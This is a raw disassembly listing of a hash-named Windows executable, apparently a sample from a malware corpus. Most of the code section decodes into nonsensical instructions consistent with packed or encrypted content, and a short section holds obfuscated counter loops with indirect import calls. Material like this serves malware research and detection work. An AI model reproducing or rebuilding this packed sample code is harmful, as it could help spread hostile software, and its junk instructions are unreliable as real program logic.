
0e35e4979a9a583aabc3b137197a5df75f05a8b5cb8b54f4c803717e1b181aa0.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	jmp    0x4013b4
  401008:	cwde   
  401009:	jb     0x400fd2
  40100b:	inc    eax
  40100c:	pop    ebp
  40100d:	pop    ebp
  40100e:	cdq    
  40100f:	retf   0xfa9e
  401012:	inc    ebp
  401013:	scas   eax,DWORD PTR es:[edi]
  401014:	lods   eax,DWORD PTR ds:[esi]
  401015:	sbb    eax,0x7e7eefd3
  40101a:	jle    0x40109a
  40101c:	xor    BYTE PTR [ecx+0x7e],0x7e
  401020:	into   
  401021:	(bad)  
  401022:	xor    ecx,ebx
  401024:	xor    eax,0xceddcfdb
  401029:	ja     0x401033
  40102b:	or     ecx,DWORD PTR [edi]
  40102d:	scas   eax,DWORD PTR es:[edi]
  40102e:	or     al,0xf
  401030:	cmp    ecx,DWORD PTR [edi]
  401032:	int3   
  401033:	adc    al,0x37
  401035:	sbb    al,0x1f
  401037:	mov    ch,0x54
  401039:	or     al,0xa7
  40103b:	ror    DWORD PTR [esi],1
  40103d:	out    dx,eax
  40103e:	mov    cl,0xd3
  401040:	(bad)  
  401041:	or     ecx,DWORD PTR [esi-0x550741ea]
  401047:	dec    ebp
  401048:	sbb    DWORD PTR [ecx+0x561fb6de],esp
  40104e:	loopne 0x4010bf
  401050:	add    ebx,DWORD PTR ds:0x4cc67490
  401056:	mov    ds:0xc8dd215b,al
  40105b:	xor    BYTE PTR [ecx-0x5c368c7e],ah
  401061:	jbe    0x40102b
  401063:	fisttp DWORD PTR [ebp+0x359cc6f5]
  401069:	jecxz  0x4010a7
  40106b:	and    ebp,0x4f
  40106e:	(bad)  
  40106f:	xchg   esi,eax
  401070:	dec    ebp
  401071:	inc    DWORD PTR [edi-0x2d5a886c]
  401077:	mov    cl,0x41
  401079:	loope  0x4010a1
  40107b:	pop    ecx
  40107c:	sub    edi,DWORD PTR [edx-0x4f61911e]
  401082:	jae    0x4010a1
  401084:	retf   
  401085:	call   0xe8ca:0x5ee3d82d
  40108c:	mov    ah,0xfc
  40108e:	loop   0x40102a
  401090:	cmp    eax,0xc76978cf
  401095:	sub    al,0xc1
  401097:	or     dl,ch
  401099:	sbb    eax,0xb39965d
  40109e:	outs   dx,DWORD PTR ds:[esi]
  40109f:	ins    DWORD PTR es:[edi],dx
  4010a0:	je     0x4010a6
  4010a2:	cmp    eax,0x24588ed1
  4010a7:	jns    0x401128
  4010a9:	pop    DWORD PTR ds:[edx]
  4010ac:	shl    DWORD PTR [esi-0x2ea6acfd],cl
  4010b2:	mov    BYTE PTR ds:0x15d550db,0x7d
  4010b9:	sahf   
  4010ba:	mov    dh,0x43
  4010bc:	daa    
  4010bd:	sbb    DWORD PTR [ebx],esp
  4010bf:	addr16 and eax,0x4f3edb12
  4010c5:	in     al,0xc1
  4010c7:	test   al,0xb4
  4010c9:	and    DWORD PTR [esi-0x534a450d],esi
  4010cf:	call   0xe1b33e19
  4010d4:	jb     0x40111c
  4010d6:	xor    BYTE PTR [edx-0x6b1129bb],al
  4010dc:	test   DWORD PTR [esi],0x46d29b8b
  4010e2:	ins    DWORD PTR es:[edi],dx
  4010e3:	ss push ecx
  4010e5:	jno    0x40114a
  4010e7:	mov    eax,0x9b1fb855
  4010ec:	xor    al,0xa8
  4010ee:	(bad)  
  4010ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4010f0:	gs pop ebx
  4010f2:	ins    BYTE PTR es:[edi],dx
  4010f3:	das    
  4010f4:	xlat   BYTE PTR ds:[ebx]
  4010f5:	mov    eax,0x9769ea7a
  4010fa:	(bad)  
  4010fb:	(bad)  
  4010fc:	fisub  WORD PTR [ecx-0x11]
  4010ff:	mov    ds:0xcbd9437f,eax
  401104:	mov    ah,0xb1
  401106:	sahf   
  401107:	pop    esp
  401108:	mov    al,0xdd
  40110a:	dec    eax
  40110b:	cmp    dl,BYTE PTR [edi+eax*8+0x6e85d4ea]
  401112:	jno    0x4010a6
  401114:	scas   al,BYTE PTR es:[edi]
  401115:	add    bl,bh
  401117:	popf   
  401118:	jo     0x40116c
  40111a:	adc    al,0x80
  40111c:	stc    
  40111d:	test   BYTE PTR [esi],cl
  40111f:	repnz repz das 
  401122:	cmp    BYTE PTR [ebx+0x1a],al
  401125:	mov    ebp,0x6cbe7995
  40112a:	mov    ah,0x99
  40112c:	(bad)  [eax+0x2f]
  40112f:	(bad)  
  401130:	(bad)  [edi]
  401132:	sub    eax,0xbb065c00
  401137:	jp     0x4010fe
  401139:	xor    DWORD PTR ds:0x2b977da4,eax
  40113f:	pop    esi
  401140:	js     0x4010d4
  401142:	loopne 0x4011b4
  401144:	cli    
  401145:	je     0x40113e
  401147:	ret    
  401148:	and    ebx,DWORD PTR [edi-0x4d]
  40114b:	cmp    DWORD PTR [esp+edi*2+0x483957bf],esp
  401152:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401154:	cld    
  401155:	cwde   
  401156:	inc    ebx
  401157:	loope  0x401164
  401159:	cmp    DWORD PTR [eax+ecx*2],edx
  40115c:	mov    al,ds:0x83a2440f
  401161:	xchg   ebx,eax
  401162:	scas   eax,DWORD PTR es:[edi]
  401163:	push   esi
  401164:	call   0xc365fbb4
  401169:	(bad)  
  40116a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40116b:	fistp  WORD PTR [ebp+0x54]
  40116e:	js     0x4010fa
  401170:	xor    BYTE PTR [ebx],al
  401172:	adc    al,0x2
  401174:	paddd  mm7,mm1
  401177:	sbb    al,BYTE PTR gs:[eax]
  40117a:	sub    eax,0xd75182c7
  40117f:	xor    ch,ch
  401181:	adc    cl,BYTE PTR [edx+0x2a]
  401184:	sbb    al,0xe1
  401186:	jecxz  0x401189
  401188:	add    DWORD PTR [eax+0x47],ebp
  40118b:	adc    al,0xa0
  40118d:	icebp  
  40118e:	mov    bh,0x4f
  401190:	fnsave [ebp+0x2e]
  401193:	lahf   
  401194:	jl     0x401119
  401196:	inc    ebp
  401197:	inc    eax
  401198:	mov    BYTE PTR [edx+0x40],dh
  40119b:	mov    dl,0x90
  40119d:	addr16 mov esp,0xaef1af4f
  4011a3:	lock leave 
  4011a5:	xchg   edx,eax
  4011a6:	shl    BYTE PTR [ecx+0x5ff61f3d],1
  4011ac:	mov    ecx,0xd2b0d372
  4011b1:	cs add al,0x83
  4011b4:	stos   BYTE PTR es:[edi],al
  4011b5:	and    edx,DWORD PTR [ebx]
  4011b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4011b8:	mov    ds:0x5ce46a87,al
  4011bd:	rcr    BYTE PTR [edi+ebp*4-0x22],0x46
  4011c2:	cmp    al,0x38
  4011c4:	sbb    al,0xb2
  4011c6:	xchg   edi,eax
  4011c7:	adc    al,0x78
  4011c9:	cs cwde 
  4011cb:	jmp    0x9029:0xcfbaf40e
  4011d2:	xchg   edi,eax
  4011d3:	rcr    BYTE PTR [ecx+esi*4],0x21
  4011d7:	push   esp
  4011d8:	loop   0x401198
  4011da:	xchg   ebp,eax
  4011db:	xor    al,0x26
  4011dd:	inc    ebp
  4011de:	sub    BYTE PTR [ebp+0x1ccb06f1],dh
  4011e4:	push   ss
  4011e5:	xor    BYTE PTR [edx+0x7d],0xf4
  4011e9:	cli    
  4011ea:	sub    BYTE PTR [ebx+eax*8+0x8],bh
  4011ee:	or     eax,DWORD PTR [edi+ebp*2]
  4011f1:	mov    DWORD PTR [ebx-0x1f989d7],esi
  4011f7:	stos   BYTE PTR es:[edi],al
  4011f8:	xor    DWORD PTR [esi],ebx
  4011fa:	jno    0x40124f
  4011fc:	adc    BYTE PTR [eax],0x97
  4011ff:	int    0xd1
  401201:	push   0xffffff88
  401203:	and    eax,0x4405f692
  401208:	es inc ebx
  40120a:	into   
  40120b:	pop    esp
  40120c:	je     0x401252
  40120e:	lea    ecx,[ebx+0x17]
  401211:	sbb    esi,DWORD PTR [esp+eiz*8]
  401214:	pop    ecx
  401215:	dec    ebp
  401216:	out    0xab,eax
  401218:	repz inc ecx
  40121a:	popa   
  40121b:	adc    eax,0xb0964794
  401220:	push   ebx
  401221:	jmp    FWORD PTR [eax]
  401223:	xchg   ebp,eax
  401224:	pop    edx
  401225:	sbb    eax,0x36a55a07
  40122a:	pop    es
  40122b:	pushf  
  40122c:	xchg   esi,eax
  40122d:	test   eax,0x6c8bdd8c
  401232:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401233:	rol    DWORD PTR [edx],0x8c
  401236:	mov    ah,0x6a
  401238:	jbe    0x4011bc
  40123a:	retf   0xb6d2
  40123d:	push   ss
  40123e:	sub    DWORD PTR [esi-0x2c],ecx
  401241:	push   ds
  401242:	mov    al,0x1e
  401244:	daa    
  401245:	mov    dh,0xde
  401247:	sbb    DWORD PTR [ebx-0x9],eax
  40124a:	and    al,0xcd
  40124c:	dec    esi
  40124d:	add    DWORD PTR [edi-0x44],eax
  401250:	pop    es
  401251:	or     ch,BYTE PTR [ebx+0x3c]
  401254:	xor    BYTE PTR [ebx+ebx*2],bl
  401257:	xor    eax,0x67276daf
  40125c:	lahf   
  40125d:	adc    edx,DWORD PTR [edx+ebx*1]
  401260:	outs   dx,DWORD PTR ds:[esi]
  401261:	pop    esp
  401262:	fistp  QWORD PTR [edx]
  401264:	ror    BYTE PTR [edi+0x3e872eeb],cl
  40126a:	and    esi,DWORD PTR [esi-0x32999430]
  401270:	call   0xd300bb82
  401275:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  401277:	pusha  
  401278:	and    al,0x7a
  40127a:	int3   
  40127b:	push   ds
  40127c:	aam    0xbd
  40127e:	dec    ebx
  40127f:	fld    QWORD PTR [ecx+edx*2]
  401282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401283:	dec    esp
  401284:	fucomp st(2)
  401286:	xlat   BYTE PTR ds:[ebx]
  401287:	ret    
  401288:	dec    esi
  401289:	push   ds
  40128a:	lock or ebx,esp
  40128d:	inc    ebx
  40128e:	mov    eax,0x6d995eb
  401293:	and    dl,BYTE PTR [esi+edi*4+0x4dfa3a39]
  40129a:	fnstcw WORD PTR [ebx+0x76]
  40129d:	ret    0x131f
  4012a0:	jle    0x4012aa
  4012a2:	mov    ecx,DWORD PTR [ebx]
  4012a4:	jl     0x4012ac
  4012a6:	inc    edi
  4012a7:	and    DWORD PTR [edx],edi
  4012a9:	in     al,dx
  4012aa:	sbb    al,0xac
  4012ac:	mov    esi,0xb8abe5f9
  4012b1:	(bad)  
  4012b3:	cld    
  4012b4:	push   edx
  4012b5:	add    eax,0xb70f38e1
  4012ba:	rol    DWORD PTR [edi+0xe],cl
  4012bd:	adc    esi,ebp
  4012bf:	jl     0x401303
  4012c1:	dec    edi
  4012c2:	outs   dx,BYTE PTR ds:[esi]
  4012c3:	pop    ecx
  4012c4:	std    
  4012c5:	repnz mov ah,dh
  4012c8:	pop    edx
  4012c9:	push   ebp
  4012ca:	xor    DWORD PTR [ebx],esp
  4012cc:	add    BYTE PTR [edi],bl
  4012ce:	stos   BYTE PTR es:[edi],al
  4012cf:	jmp    0x9c2d:0x70b2e04d
  4012d6:	add    edx,esi
  4012d8:	sbb    ebp,DWORD PTR [ecx+0x4b541ac2]
  4012de:	test   BYTE PTR [ecx-0x2421f8ef],0x53
  4012e5:	sbb    dl,BYTE PTR [ecx+eiz*4+0x66354e75]
  4012ec:	test   BYTE PTR [esi],0x6
  4012ef:	add    al,0x71
  4012f1:	fs (bad) 
  4012f3:	xchg   edi,eax
  4012f4:	js     0x401331
  4012f6:	cmp    edi,esp
  4012f8:	push   esp
  4012f9:	xchg   BYTE PTR [edx-0x64],dh
  4012fc:	fsubr  QWORD PTR [esi+0x5ef6f1ae]
  401302:	xchg   BYTE PTR [edx+0x7cf4bad1],dh
  401308:	fst    QWORD PTR [eax+esi*4+0x3e05a98a]
  40130f:	cmp    al,cl
  401311:	into   
  401312:	sub    bh,BYTE PTR [ebx+0x791b4fd]
  401318:	mov    ds:0xad75529b,al
  40131d:	sbb    al,0xbc
  40131f:	pop    esi
  401320:	pop    edi
  401321:	pop    ds
  401322:	cs and eax,0x7665ae7b
  401328:	or     al,BYTE PTR [ebp+0x15d03648]
  40132e:	data16 sahf 
  401330:	out    0xec,al
  401332:	mov    al,ds:0x4587afcb
  401337:	sub    DWORD PTR [eax],ebx
  401339:	fld    QWORD PTR [ecx+0x47]
  40133c:	out    dx,eax
  40133d:	into   
  40133e:	cs gs iret 
  401341:	loopne 0x401385
  401343:	ror    DWORD PTR [eax-0x2],0xdf
  401347:	inc    BYTE PTR [ebp-0x72ff9b4b]
  40134d:	push   edi
  40134e:	push   0xffffff8e
  401350:	ror    DWORD PTR [edi-0x55],1
  401353:	ret    
  401354:	add    esi,DWORD PTR [esi+ebx*2]
  401357:	and    BYTE PTR [eax],bh
  401359:	push   eax
  40135a:	pop    es
  40135b:	xor    DWORD PTR [ebx-0x297065fb],ebp
  401361:	icebp  
  401362:	popa   
  401363:	jmp    0x4013b8
  401365:	lahf   
  401366:	mov    ebx,DWORD PTR [ebx+0x5d]
  401369:	push   cs
  40136a:	inc    ecx
  40136b:	nop
  40136c:	jns    0x401333
  40136e:	fcmovne st,st(1)
  401370:	pop    ecx
  401371:	pop    esp
  401372:	into   
  401373:	xchg   ecx,eax
  401374:	jge    0x4013e6
  401376:	lods   eax,DWORD PTR ds:[esi]
  401377:	jmp    0x4013c4
  401379:	inc    ebp
  40137a:	dec    edi
  40137b:	xchg   ebp,eax
  40137c:	mov    bl,0xb4
  40137e:	mov    edi,0x60c8fd5b
  401383:	call   0x95fe:0xf001f9cc
  40138a:	xchg   edi,eax
  40138b:	repnz (bad) [edx+edi*2-0x46]
  401390:	dec    esi
  401391:	sub    al,al
  401393:	adc    BYTE PTR [edx],dh
  401395:	dec    ebx
  401396:	out    dx,eax
  401397:	jl     0x401331
  401399:	and    al,0x8b
  40139b:	sti    
  40139c:	nop
  40139d:	inc    edi
  40139e:	xor    al,BYTE PTR [ecx]
  4013a0:	add    al,0x8f
  4013a2:	in     eax,0x27
  4013a4:	scas   eax,DWORD PTR es:[edi]
  4013a5:	and    dl,BYTE PTR [edx]
  4013a7:	sbb    ebx,0xffffffd3
  4013aa:	cmp    eax,0x33ab8701
  4013af:	out    0xb2,eax
  4013b1:	pop    esp
  4013b2:	cmc    
  4013b3:	add    BYTE PTR [ebx+0x45c72cec],0xf8
  4013ba:	xor    al,BYTE PTR [ebp+0x3d19f89c]
  4013c0:	xchg   BYTE PTR [ebx+eax*2],al
  4013c3:	add    bh,al
  4013c5:	inc    ebp
  4013c6:	in     al,dx
  4013c7:	xor    eax,0x2bf89c85
  4013cc:	enter  0x7b8,0x95
  4013d0:	add    BYTE PTR [eax],al
  4013d2:	mov    WORD PTR [ebp-0x4],ax
  4013d6:	mov    DWORD PTR ds:0x42ee20,0x1f
  4013e0:	cmp    DWORD PTR ds:0x42ee20,0x0
  4013e7:	je     0x40141b
  4013ed:	cmp    DWORD PTR ds:0x42ee20,0x27
  4013f4:	jne    0x401403
  4013fa:	push   DWORD PTR [ebp-0x1c]
  4013fd:	call   DWORD PTR ds:0x42e9ec
  401403:	mov    ecx,DWORD PTR ds:0x42ee20
  401409:	dec    ecx
  40140a:	mov    DWORD PTR ds:0x42ee20,ecx
  401410:	jmp    0x4013e0
  401415:	sub    ecx,DWORD PTR ds:0x42ee24
  40141b:	lea    eax,[ebp-0x24]
  40141e:	mov    DWORD PTR ds:0x430556,0x15
  401428:	cmp    DWORD PTR ds:0x430556,0x0
  40142f:	je     0x401491
  401435:	cmp    DWORD PTR ds:0x430556,0x9
  40143c:	jne    0x40145f
  401442:	push   DWORD PTR [ebp-0x28]
  401445:	push   0x42e7e5
  40144a:	push   0x78ed
  40144f:	push   0x520a
  401454:	push   0x5250
  401459:	call   DWORD PTR ds:0x42e9f0
  40145f:	cmp    DWORD PTR ds:0x430556,0xa
  401466:	jne    0x401479
  40146c:	mov    ecx,DWORD PTR ds:0x430556
  401472:	dec    ecx
  401473:	mov    DWORD PTR ds:0x430556,ecx
  401479:	mov    ecx,DWORD PTR ds:0x430556
  40147f:	dec    ecx
  401480:	mov    DWORD PTR ds:0x430556,ecx
  401486:	jmp    0x401428
  40148b:	and    ecx,DWORD PTR ds:0x43049a
  401491:	mov    DWORD PTR [ebp-0x28],eax
  401494:	and    ecx,ecx
  401496:	mov    eax,DWORD PTR [ebp+0x8]
  401499:	jmp    0x40184a
  40149e:	sub    ch,BYTE PTR [esi+0x5aba4a9e]
  4014a4:	jmp    0x8850:0xc48b26e
  4014ab:	sub    DWORD PTR [ecx*1+0x7e7e7182],ecx
  4014b2:	xor    BYTE PTR [ecx+0x7e],0x7e
  4014b6:	sub    ebp,eax
  4014b8:	fnstcw WORD PTR [edi]
  4014ba:	daa    
  4014bb:	and    eax,0x1285119a
  4014c0:	(bad)  
  4014c1:	fs pop eax
  4014c3:	es mov ecx,db4
  4014c7:	inc    eax
  4014c8:	shl    DWORD PTR ds:0x36256e23,0x95
  4014cf:	add    BYTE PTR [edi],ah
  4014d1:	call   0x8f237b7a
  4014d6:	outs   dx,BYTE PTR ds:[esi]
  4014d7:	sahf   
  4014d8:	int3   
  4014d9:	xor    DWORD PTR [ebp+0x73],0xffffffcf
  4014dd:	inc    edx
  4014de:	dec    DWORD PTR gs:[ebx+0x27]
  4014e2:	neg    BYTE PTR [esp+ecx*8]
  4014e5:	pop    eax
  4014e6:	xchg   ebx,eax
  4014e7:	mov    ds:0x2a1d244,al
  4014ec:	and    DWORD PTR [eax-0xb],0x7a20060
  4014f3:	mov    bl,0xe7
  4014f5:	lahf   
  4014f6:	das    
  4014f7:	mov    ebp,0xda8bfa43
  4014fc:	and    DWORD PTR [eax-0x4d],ebp
  4014ff:	mov    esp,0xa39b6823
  401504:	fisub  WORD PTR [esi-0x4b]
  401507:	icebp  
  401508:	mov    esi,0x5c2a932d
  40150d:	test   BYTE PTR [edx*1-0x129a5f1d],bl
  401514:	addr16 xor eax,0x1e06059e
  40151a:	cmp    eax,0xaaf5349c
  40151f:	xchg   edi,eax
  401520:	push   ebp
  401521:	stos   BYTE PTR es:[edi],al
  401522:	sbb    DWORD PTR [edi-0x364cc308],0xfffffffc
  401529:	imul   edi,DWORD PTR [ebx],0x5f3fa128
  40152f:	jg     0x40151b
  401531:	das    
  401532:	and    eax,0xa4a38670
  401537:	shl    BYTE PTR [edx-0x6d],1
  40153a:	mov    bl,0xbb
  40153c:	sbb    esi,DWORD PTR [edx+0x6e5bac93]
  401542:	xor    eax,DWORD PTR [esp+ecx*2]
  401545:	mov    ch,BYTE PTR [ecx+0x1f]
  401548:	fs xor al,0x45
  40154b:	std    
  40154c:	and    al,0xab
  40154e:	pop    eax
  40154f:	xchg   edi,eax
  401550:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401551:	ins    DWORD PTR es:[edi],dx
  401552:	outs   dx,DWORD PTR ds:[esi]
  401553:	dec    esi
  401554:	dec    ecx
  401555:	mov    BYTE PTR [eax],0xd1
  401558:	shl    DWORD PTR [ebx+0x6a],cl
  40155b:	cmp    al,0x9d
  40155d:	(bad)  [ecx+0x27420f18]
  401563:	stc    
  401564:	pop    ebx
  401565:	mov    edi,0x339308b1
  40156a:	out    0x5c,eax
  40156c:	mov    al,ds:0xd4da757
  401571:	stos   DWORD PTR es:[edi],eax
  401572:	inc    edi
  401573:	test   eax,0x60817eb8
  401578:	sbb    eax,0x15a9f770
  40157d:	adc    DWORD PTR [ebp-0x3],esi
  401580:	jge    0x4015ba
  401582:	xlat   BYTE PTR ds:[ebx]
  401583:	mov    WORD PTR [edi],ds
  401585:	test   al,0x73
  401587:	dec    esi
  401588:	mov    fs,WORD PTR [edi]
  40158a:	adc    cl,BYTE PTR [ebp+0x1]
  40158d:	and    eax,DWORD PTR cs:[edx]
  401590:	out    0x71,eax
  401592:	dec    ebx
  401593:	mov    cl,0xad
  401595:	mov    ecx,eax
  401597:	pop    edi
  401598:	pop    eax
  401599:	jecxz  0x401573
  40159b:	add    eax,0x3a5b8afc
  4015a0:	jp     0x401616
  4015a2:	cmp    BYTE PTR [esp+ebp*8],0x2f
  4015a6:	or     DWORD PTR [edi],ebx
  4015a8:	pcmpgtw mm0,QWORD PTR [edx+0x19]
  4015ac:	pop    ecx
  4015ad:	stos   BYTE PTR es:[edi],al
  4015ae:	cs cmp dl,dh
  4015b1:	lods   al,BYTE PTR ds:[esi]
  4015b2:	shr    eax,1
  4015b4:	push   ebx
  4015b5:	rol    BYTE PTR [edx],cl
  4015b7:	mul    BYTE PTR [esi]
  4015b9:	cmp    al,0x69
  4015bb:	std    
  4015bc:	mov    ebp,0x3a3768f4
  4015c1:	mov    ch,0xf7
  4015c3:	call   0xd2db:0xbeb8c4f4
  4015ca:	dec    esi
  4015cb:	push   es
  4015cc:	xor    al,0x90
  4015ce:	fisttp WORD PTR [edx-0x260f9592]
  4015d4:	aaa    
  4015d5:	jmp    0xee93099c
  4015da:	mov    DWORD PTR [edx-0x19fc0362],ecx
  4015e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015e1:	xchg   BYTE PTR [edx],ch
  4015e3:	test   al,0x92
  4015e5:	out    0xd7,eax
  4015e7:	mov    ds:0xfa948240,al
  4015ec:	mov    DWORD PTR [edi+0x6246c9ba],esi
  4015f2:	rcr    DWORD PTR [esp+edi*2-0x1bf982c4],0x6e
  4015fa:	or     ch,dh
  4015fc:	sbb    al,0x94
  4015fe:	rcl    BYTE PTR [esi-0x70a5f728],cl
  401604:	fwait
  401605:	mov    ch,0x3e
  401607:	add    al,0x87
  401609:	(bad)  
  40160a:	sbb    ecx,DWORD PTR [esi]
  40160c:	iret   
  40160d:	addr16 jp 0x40161f
  401610:	or     DWORD PTR [ecx-0xa],ecx
  401613:	add    esp,DWORD PTR [eax]
  401615:	push   edi
  401616:	inc    edi
  401617:	jge    0x4015c4
  401619:	add    eax,0x9ba8a659
  40161e:	in     eax,dx
  40161f:	jecxz  0x4015df
  401621:	mov    bl,0x7b
  401624:	out    0xd9,al
  401626:	jg     0x4015c0
  401628:	jae    0x4015f8
  40162a:	cmp    cl,BYTE PTR [ecx-0x47]
  40162d:	cmp    DWORD PTR [ecx-0x50],eax
  401630:	daa    
  401631:	add    BYTE PTR [edx-0x7e],ah
  401634:	lea    ebp,[ecx-0x6dfeebc4]
  40163a:	push   cs
  40163b:	xor    dh,BYTE PTR [ebx-0x3e962909]
  401641:	icebp  
  401642:	test   cl,ah
  401644:	cmp    ch,al
  401646:	or     edx,edi
  401648:	div    DWORD PTR [edx]
  40164a:	pop    sp
  40164c:	add    eax,0x80ca172d
  401651:	(bad)  
  401652:	(bad)  
  401653:	addr16 pop ss
  401655:	mov    al,0x43
  401657:	mov    ebp,0x171ca32f
  40165c:	adc    eax,0x91008635
  401661:	(bad)  
  401662:	pop    ss
  401663:	dec    esp
  401664:	adc    al,0x46
  401666:	push   edi
  401667:	mov    cl,0x8f
  401669:	(bad)  
  40166a:	test   eax,0x78af3dac
  40166f:	mov    edi,0xf6bd1a13
  401674:	repnz das 
  401676:	xor    eax,0x9fcfedf9
  40167b:	and    DWORD PTR [eax-0x246c73f7],edi
  401681:	cli    
  401682:	cmp    eax,0x4ff565d6
  401687:	sbb    eax,0x10320734
  40168c:	call   0xe0f5:0x1c87a659
  401693:	pop    ds
  401694:	daa    
  401695:	iret   
  401696:	xchg   DWORD PTR [edi-0x7fa56bca],esi
  40169c:	icebp  
  40169d:	add    BYTE PTR [edi],dl
  40169f:	call   0x4acdcaf8
  4016a4:	call   0x50:0xf48b1b17
  4016ab:	jge    0x4016bd
  4016ad:	jp     0x401662
  4016af:	add    ch,BYTE PTR [edx]
  4016b1:	rcr    DWORD PTR [bx+di-0xe60],1
  4016b6:	jnp    0x4016a5
  4016b8:	and    al,BYTE PTR [edi]
  4016ba:	pusha  
  4016bb:	or     BYTE PTR [ecx],0xee
  4016be:	jp     0x4016d3
  4016c0:	sbb    dh,BYTE PTR [edi+edx*4+0x39375c8b]
  4016c7:	jge    0x40164e
  4016c9:	or     eax,0xa0264e43
  4016ce:	mov    dh,0x9e
  4016d0:	or     BYTE PTR [edi+0x54],dl
  4016d3:	pop    ecx
  4016d4:	fnsave [eax+0x39]
  4016d7:	mov    cl,0xdb
  4016d9:	das    
  4016da:	shl    BYTE PTR [eax-0x1dc07893],0x8
  4016e1:	repz aad 0x3b
  4016e4:	inc    ebp
  4016e5:	les    edx,FWORD PTR [ecx-0x59fa0098]
  4016eb:	loopne 0x401720
  4016ed:	xor    al,0x1f
  4016ef:	mov    cr1,esp
  4016f2:	mov    ebx,DWORD PTR ds:0xc38f1b6c
  4016f8:	xor    ah,al
  4016fa:	jp     0x401687
  4016fc:	inc    esi
  4016fd:	or     DWORD PTR [esi],0x3444abfe
  401703:	mov    eax,ds:0xfd604715
  401708:	in     al,dx
  401709:	sti    
  40170a:	lds    esp,FWORD PTR [ebx]
  40170c:	jg     0x401711
  40170e:	jns    0x40170e
  401710:	popa   
  401711:	cs push edi
  401713:	in     eax,0x85
  401715:	cmp    DWORD PTR [ebp-0x6c],ecx
  401718:	ins    DWORD PTR es:[edi],dx
  401719:	imul   ebx,DWORD PTR [eax+0xc1cc64],0x18
  401720:	inc    ecx
  401721:	sub    eax,0xfe9347aa
  401726:	sub    eax,0xfe44c57c
  40172b:	jmp    0x40179f
  40172d:	and    al,0x9d
  40172f:	neg    DWORD PTR [edx-0x792fc365]
  401735:	pop    es
  401736:	cmc    
  401737:	fldenv [eax+0x5e49911e]
  40173d:	(bad)  
  40173e:	hlt    
  40173f:	retf   
  401740:	mov    BYTE PTR [ecx-0x66],bh
  401743:	popf   
  401744:	(bad)  
  401745:	push   ss
  401746:	sar    BYTE PTR [eax+0x2014e214],cl
  40174c:	mov    cl,0xe5
  40174e:	pop    es
  40174f:	mov    ebx,DWORD PTR [esp+ebx*1]
  401752:	inc    esp
  401753:	and    ch,cl
  401755:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401756:	xchg   esi,eax
  401757:	mov    esp,0x701490ca
  40175c:	mov    dh,0xec
  40175e:	push   ds
  40175f:	mov    ebp,0x6a81864c
  401764:	pop    esp
  401765:	xchg   esi,eax
  401766:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401767:	xchg   ecx,eax
  401768:	lods   eax,DWORD PTR ds:[esi]
  401769:	sbb    esp,0x8827350f
  40176f:	lock mov bl,0x31
  401772:	rcr    DWORD PTR [ecx],0xe6
  401775:	fdiv   QWORD PTR [eax+0x21]
  401778:	dec    BYTE PTR [ecx]
  40177a:	and    DWORD PTR [esi],esp
  40177c:	mov    edi,DWORD PTR [edx]
  40177e:	jbe    0x4017e1
  401780:	jb     0x401750
  401782:	in     al,dx
  401783:	fistp  QWORD PTR [edi+0x2f]
  401786:	daa    
  401787:	pop    es
  401788:	sbb    DWORD PTR [ebx],0x89b6a013
  40178e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40178f:	dec    edx
  401790:	jmp    0x184b8421
  401795:	and    eax,0xc30df386
  40179a:	mov    eax,ds:0x381a0c94
  40179f:	(bad)  [eax-0x72]
  4017a2:	mov    esi,0xc269f08b
  4017a7:	repz das 
  4017a9:	imul   BYTE PTR ds:0x16267b0c
  4017af:	adc    ch,0x52
  4017b2:	fdiv   QWORD PTR [esi-0x12]
  4017b5:	pop    ecx
  4017b6:	inc    ebp
  4017b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017b8:	pop    edi
  4017b9:	fwait
  4017ba:	scas   al,BYTE PTR es:[edi]
  4017bb:	retf   
  4017bc:	inc    edx
  4017bd:	lahf   
  4017be:	mov    ah,BYTE PTR ds:0xc4e6f785
  4017c4:	mov    ebp,0x56784201
  4017c9:	out    0x2f,al
  4017cb:	jnp    0x4017bf
  4017cd:	rcr    al,0x6d
  4017d0:	and    dh,al
  4017d2:	jns    0x401817
  4017d4:	xlat   BYTE PTR ds:[ebx]
  4017d5:	(bad)  
  4017d6:	in     al,0x44
  4017d8:	mov    ch,0x64
  4017da:	mov    dh,0xf8
  4017dc:	add    eax,0xecb9c2e7
  4017e1:	rol    bl,1
  4017e3:	popf   
  4017e4:	aam    0x15
  4017e6:	(bad)  
  4017e7:	jmp    0xde06:0xbb5a08fa
  4017ee:	add    ebp,ebx
  4017f0:	stc    
  4017f1:	adc    DWORD PTR [edx+0xd],edi
  4017f4:	jg     0x76d3cd1d
  4017fa:	outs   dx,DWORD PTR ds:[esi]
  4017fb:	or     bh,dl
  4017fd:	cld    
  4017fe:	adc    edi,DWORD PTR [esi-0x46]
  401801:	cs cld 
  401803:	retf   0xbf43
  401806:	cmc    
  401807:	xchg   ebp,eax
  401808:	push   ds
  401809:	mov    dh,0xc0
  40180b:	or     esi,eax
  40180d:	mov    ecx,0xf5d49240
  401812:	ins    DWORD PTR es:[edi],dx
  401813:	xchg   ecx,eax
  401814:	jp     0x40181e
  401816:	ss push ecx
  401818:	inc    edx
  401819:	or     eax,0x89f140a1
  40181e:	mov    eax,0x437f7315
  401823:	mov    DWORD PTR [edi+0x10c4b2e8],ecx
  401829:	stos   BYTE PTR es:[edi],al
  40182a:	push   0xcfc34937
  40182f:	mov    ecx,0xbbfb357c
  401834:	sub    al,0xf2
  401836:	fsubrp st(5),st
  401838:	addr16 into 
  40183a:	jns    0x4017cc
  40183c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40183d:	cmc    
  40183e:	push   ecx
